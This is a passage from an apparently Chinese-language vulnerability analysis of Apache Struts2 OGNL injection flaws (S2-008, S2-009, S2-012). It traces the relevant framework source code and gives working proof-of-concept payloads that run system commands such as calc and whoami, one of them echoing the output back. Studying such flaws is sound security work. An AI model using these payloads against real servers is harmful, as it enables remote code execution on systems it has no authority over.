</span></span></span></code></pre></td></tr></table></div></div><p>可以看到，如果开启Debug模式，可以从前端接收参数 <code>debug</code> ，如果 <code>debug</code> 的值为 <code>command</code> ，则会进入： <code>else if ("command".equals(type)) {</code> 分支，可以看到这个分支内的处理逻辑，首先获取一个ValueStack，然后从前端获取 <code>expression</code> 参数，在 <code>writer.print(stack.findValue(cmd));</code> 处，触发执行前端传来的Ognl表达式，从而造成Ognl表达式注入；</p><p><img src=/media/image-20210816115431008.png alt=image-20210816115431008></p><p><img src=/media/image-20210816115501671.png alt=image-20210816115501671></p><p>此外，还存在一个漏洞位置（Tomcat下没法打，原因下面讲），如果开启了Cookie拦截器，那么漏洞位置就发生在 <code>org.apache.struts2.interceptor.CookieInterceptor#intercept(ActionInvocation)</code> 中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>String</span> <span class=nf>intercept</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>LOG</span><span class=o>.</span><span class=na>isDebugEnabled</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>LOG</span><span class=o>.</span><span class=na>debug</span><span class=o>(</span><span class=s>&#34;start interception&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>String</span><span class=o>&gt;</span> <span class=n>cookiesMap</span> <span class=o>=</span> <span class=k>new</span> <span class=n>LinkedHashMap</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Cookie</span><span class=o>[]</span> <span class=n>cookies</span> <span class=o>=</span> <span class=n>ServletActionContext</span><span class=o>.</span><span class=na>getRequest</span><span class=o>().</span><span class=na>getCookies</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>cookies</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ValueStack</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>ActionContext</span><span class=o>.</span><span class=na>getContext</span><span class=o>().</span><span class=na>getValueStack</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>Cookie</span><span class=o>[]</span> <span class=n>arr$</span> <span class=o>=</span> <span class=n>cookies</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len$</span> <span class=o>=</span> <span class=n>cookies</span><span class=o>.</span><span class=na>length</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=o>(</span><span class=kt>int</span> <span class=n>i$</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i$</span> <span class=o>&lt;</span> <span class=n>len$</span><span class=o>;</span> <span class=o>++</span><span class=n>i$</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>Cookie</span> <span class=n>cookie</span> <span class=o>=</span> <span class=n>arr$</span><span class=o>[</span><span class=n>i$</span><span class=o>];</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>name</span> <span class=o>=</span> <span class=n>cookie</span><span class=o>.</span><span class=na>getName</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>value</span> <span class=o>=</span> <span class=n>cookie</span><span class=o>.</span><span class=na>getValue</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesNameSet</span><span class=o>.</span><span class=na>contains</span><span class=o>(</span><span class=s>&#34;*&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>LOG</span><span class=o>.</span><span class=na>isDebugEnabled</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>LOG</span><span class=o>.</span><span class=na>debug</span><span class=o>(</span><span class=s>&#34;contains cookie name [*] in configured cookies name set, cookie with name [&#34;</span> <span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=s>&#34;] with value [&#34;</span> <span class=o>+</span> <span class=n>value</span> <span class=o>+</span> <span class=s>&#34;] will be injected&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>.</span><span class=na>populateCookieValueIntoStack</span><span class=o>(</span><span class=n>name</span><span class=o>,</span> <span class=n>value</span><span class=o>,</span> <span class=n>cookiesMap</span><span class=o>,</span> <span class=n>stack</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesNameSet</span><span class=o>.</span><span class=na>contains</span><span class=o>(</span><span class=n>cookie</span><span class=o>.</span><span class=na>getName</span><span class=o>()))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>.</span><span class=na>populateCookieValueIntoStack</span><span class=o>(</span><span class=n>name</span><span class=o>,</span> <span class=n>value</span><span class=o>,</span> <span class=n>cookiesMap</span><span class=o>,</span> <span class=n>stack</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>.</span><span class=na>injectIntoCookiesAwareAction</span><span class=o>(</span><span class=n>invocation</span><span class=o>.</span><span class=na>getAction</span><span class=o>(),</span> <span class=n>cookiesMap</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>invocation</span><span class=o>.</span><span class=na>invoke</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，这里会获取Cookies，然后判断当前配置的 <code>cookiesName</code> 是否包含 <code>*</code> 符号或者前端发送的cookieName是否和配置中的一致。如果通过判断，则会调用 <code>this.populateCookieValueIntoStack(name, value, cookiesMap, stack);</code> ，继续跟进：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span> <span class=kt>void</span> <span class=nf>populateCookieValueIntoStack</span><span class=o>(</span><span class=n>String</span> <span class=n>cookieName</span><span class=o>,</span> <span class=n>String</span> <span class=n>cookieValue</span><span class=o>,</span> <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>String</span><span class=o>&gt;</span> <span class=n>cookiesMap</span><span class=o>,</span> <span class=n>ValueStack</span> <span class=n>stack</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(!</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesValueSet</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>()</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesValueSet</span><span class=o>.</span><span class=na>contains</span><span class=o>(</span><span class=s>&#34;*&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesValueSet</span><span class=o>.</span><span class=na>contains</span><span class=o>(</span><span class=n>cookieValue</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>LOG</span><span class=o>.</span><span class=na>isDebugEnabled</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>LOG</span><span class=o>.</span><span class=na>debug</span><span class=o>(</span><span class=s>&#34;both configured cookie name and value matched, cookie [&#34;</span> <span class=o>+</span> <span class=n>cookieName</span> <span class=o>+</span> <span class=s>&#34;] with value [&#34;</span> <span class=o>+</span> <span class=n>cookieValue</span> <span class=o>+</span> <span class=s>&#34;] will be injected&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>cookiesMap</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=n>cookieName</span><span class=o>,</span> <span class=n>cookieValue</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>stack</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>cookieName</span><span class=o>,</span> <span class=n>cookieValue</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>LOG</span><span class=o>.</span><span class=na>isDebugEnabled</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesValueSet</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>LOG</span><span class=o>.</span><span class=na>debug</span><span class=o>(</span><span class=s>&#34;no cookie value is configured, cookie with name [&#34;</span> <span class=o>+</span> <span class=n>cookieName</span> <span class=o>+</span> <span class=s>&#34;] with value [&#34;</span> <span class=o>+</span> <span class=n>cookieValue</span> <span class=o>+</span> <span class=s>&#34;] will be injected&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>cookiesValueSet</span><span class=o>.</span><span class=na>contains</span><span class=o>(</span><span class=s>&#34;*&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>LOG</span><span class=o>.</span><span class=na>debug</span><span class=o>(</span><span class=s>&#34;interceptor is configured to accept any value, cookie with name [&#34;</span> <span class=o>+</span> <span class=n>cookieName</span> <span class=o>+</span> <span class=s>&#34;] with value [&#34;</span> <span class=o>+</span> <span class=n>cookieValue</span> <span class=o>+</span> <span class=s>&#34;] will be injected&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=n>cookiesMap</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=n>cookieName</span><span class=o>,</span> <span class=n>cookieValue</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>stack</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>cookieName</span><span class=o>,</span> <span class=n>cookieValue</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里也可以看出，如果配置的 <code>cookiesValue</code> 为 <code>*</code> 符号或者前端发送的cookieValue和配置中的一致，则会调用 <code>stack.setValue(cookieName, cookieValue);</code> ，这个方法底层执行了Ognl表达式，于是这里原理上是存在一个Ognl表达式注入的。但是没法打。为啥？因为： <strong>Tomcat限制了特殊字符无法通过cookieName发送给后端，所以没法打</strong> 。但是也不一定， <strong>如果靶机的业务存在一个前置的URL解码，会解码CookieName，那么我们就可以使用URL编码来使用这个漏洞进行攻击了</strong> 。</p><h2 id=s2-009>S2-009</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.1.1</p><p>CVE编号：CVE-2011-3923</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 下面的skillName代表后台String类型的参数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>skillName</span><span class=o>=(</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=s>&#34;xwork.MethodAccessor.denyMethodExecution&#34;</span><span class=o>]=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>(</span><span class=kc>false</span><span class=o>),</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=s>&#34;allowStaticMethodAccess&#34;</span><span class=o>]=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>(</span><span class=kc>true</span><span class=o>),</span> <span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>calc</span><span class=err>&#39;</span><span class=o>))(</span><span class=n>meh</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>skillName</span><span class=o>)(</span><span class=err>&#39;</span><span class=n>pinger</span><span class=err>&#39;</span><span class=o>)=</span><span class=kc>true</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞是对S2-005的绕过，S2-005主要增加了严格的参数名验证，无法再使用UNICODE进行绕过，但是它 <strong>仅仅是对参数名进行了验证，没有对参数值进行验证</strong> 。经过 <code>param=your_ognlExpression</code> 后，我们的恶意Ognl表达式会进入Ognl的上下文中（且可以通过验证，因为Struts2没有验证参数值，只验证了参数名），后续我们通过 <code>(param)(constName)=true</code> 即可调用前面存入上下文中的Ognl表达式，从而RCE。如下图所示：</p><p><img src=/media/image-20210816134546841.png alt=image-20210816134546841></p><h2 id=s2-012>S2-012</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p><p>CVE编号：CVE-2013-1965</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 无回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{(</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=o>)(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>true</span><span class=o>)(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>calc</span><span class=err>&#39;</span><span class=o>))}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 有回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{</span><span class=err>#</span><span class=n>a</span><span class=o>=(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>[]{</span><span class=s>&#34;whoami&#34;</span><span class=o>})).</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>).</span><span class=na>start</span><span class=o>(),</span><span class=err>#</span><span class=n>b</span><span class=o>=</span><span class=err>#</span><span class=n>a</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>(),</span><span class=err>#</span><span class=n>c</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>InputStreamReader</span><span class=o>(</span><span class=err>#</span><span class=n>b</span><span class=o>),</span><span class=err>#</span><span class=n>d</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>BufferedReader</span><span class=o>(</span><span class=err>#</span><span class=n>c</span><span class=o>),</span><span class=err>#</span><span class=n>e</span><span class=o>=</span><span class=k>new</span> <span class=kt>char</span><span class=o>[</span><span class=n>50000</span><span class=o>],</span><span class=err>#</span><span class=n>d</span><span class=o>.</span><span class=na>read</span><span class=o>(</span><span class=err>#</span><span class=n>e</span><span class=o>),</span><span class=err>#</span><span class=n>f</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=s>&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;</span><span class=o>),</span><span class=err>#</span><span class=n>f</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>println</span><span class=o>(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>(</span><span class=err>#</span><span class=n>e</span><span class=o>)),</span><span class=err>#</span><span class=n>f</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>flush</span><span class=o>(),</span><span class=err>#</span><span class=n>f</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>close</span><span class=o>()}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞发生在redirect位置，例如如下配置一个redirect：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;package</span> <span class=na>name=</span><span class=s>&#34;S2-012&#34;</span> <span class=na>extends=</span><span class=s>&#34;struts-default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;action</span> <span class=na>name=</span><span class=s>&#34;user&#34;</span> <span class=na>class=</span><span class=s>&#34;com.demo.action.UserAction&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;result</span> <span class=na>name=</span><span class=s>&#34;redirect&#34;</span> <span class=na>type=</span><span class=s>&#34;redirect&#34;</span><span class=nt>&gt;</span>/index.jsp?name=${name}<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;result</span> <span class=na>name=</span><span class=s>&#34;input&#34;</span><span class=nt>&gt;</span>/index.jsp<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;result</span> <span class=na>name=</span><span class=s>&#34;success&#34;</span><span class=nt>&gt;</span>/index.jsp<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/action&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/package&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>其中redirect地址中的 <code>${name}</code> 如果是攻击者可控的，那么将造成Ognl表达式注入，例如如下所示 <code>UserAction</code> 所示， <code>${name}</code> 就是攻击者可控的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>UserAction</span> <span class=kd>extends</span> <span class=n>ActionSupport</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=n>String</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=nf>UserAction</span><span class=o>()</span> <span class=o>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setName</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>name</span> <span class=o>=</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>getName</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>execute</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>!</span><span class=k>this</span><span class=o>.</span><span class=na>name</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>()</span> <span class=o>?</span> <span class=s>&#34;redirect&#34;</span> <span class=o>:</span> <span class=s>&#34;success&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>漏洞入口在 <code>org.apache.struts2.dispatcher.ServletRedirectResult#execute(ActionInvocation)</code> 方法。调用栈如下：</p><p><img src=/media/image-20210816144225939.png alt=image-20210816144225939></p><p>这里可能会有一个疑问，不是从S2-001开始，就在 <code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables()</code> 中限制解析的层数最多为1层了嘛，为啥这里还能二次解析 <code>${name}</code> 得到的值？首先看到代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=n>Object</span> <span class=nf>translateVariables</span><span class=o>(</span><span class=kt>char</span><span class=o>[]</span> <span class=n>openChars</span><span class=o>,</span> <span class=n>String</span> <span class=n>expression</span><span class=o>,</span> <span class=n>ValueStack</span> <span class=n>stack</span><span class=o>,</span> <span class=n>Class</span> <span class=n>asType</span><span class=o>,</span> <span class=n>ParsedValueEvaluator</span> <span class=n>evaluator</span><span class=o>,</span> <span class=kt>int</span> <span class=n>maxLoopCount</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// deal with the &#34;pure&#34; expressions first!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//expression = expression.trim();
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Object</span> <span class=n>result</span> <span class=o>=</span> <span class=n>expression</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>char</span> <span class=n>open</span> <span class=o>:</span> <span class=n>openChars</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>loopCount</span> <span class=o>=</span> <span class=n>1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>pos</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//this creates an implicit StringBuffer and shouldn&#39;t be used in the inner loop
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>final</span> <span class=n>String</span> <span class=n>lookupChars</span> <span class=o>=</span> <span class=n>open</span> <span class=o>+</span> <span class=s>&#34;{&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=o>(</span><span class=kc>true</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>start</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=n>lookupChars</span><span class=o>,</span> <span class=n>pos</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>start</span> <span class=o>==</span> <span class=o>-</span><span class=n>1</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>pos</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=n>loopCount</span><span class=o>++;</span>
</span></span><span class=line><span class=cl>                <span class=n>start</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=n>lookupChars</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>loopCount</span> <span class=o>&gt;</span> <span class=n>maxLoopCount</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// translateVariables prevent infinite loop / expression recursive evaluation
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>			<span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=o>}</span>
</span></span><span class=line><span class=cl>		<span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
